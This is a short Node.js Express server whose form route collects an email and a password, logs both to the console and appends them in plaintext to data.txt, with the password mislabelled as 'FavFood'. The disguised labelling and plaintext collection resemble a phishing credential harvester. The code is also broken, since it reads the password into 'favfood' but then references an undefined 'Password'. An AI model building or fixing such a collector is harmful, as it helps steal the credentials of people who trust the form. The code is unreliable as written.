const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 8080;

// Parse form data
app.use(express.urlencoded({ extended: true }));

// Serve frontend
app.use(express.static("public"));

// FORM SUBMIT
app.post("/submit", (req, res) => {
  const email = req.body.email;
  const favfood = req.body.Password;

  // 🔥 THIS IS WHAT YOU WERE MISSING
  console.log("NEW SUBMISSION RECEIVED:");
  console.log("Email:", email);
  console.log("Password:", Password);
  console.log("--------------------------");

  const entry = `
Email: ${email}
FavFood: ${Password}
Time: ${new Date().toLocaleString()}
-----------------------------
`;

  fs.appendFileSync(path.join(__dirname, "data.txt"), entry);

  // 10 second delay then reload page
  setTimeout(() => {
    res.redirect("/");
  }, 10000);
});

// START SERVER
app.listen(PORT, () => {
  console.log("Server started on port:", PORT);
});
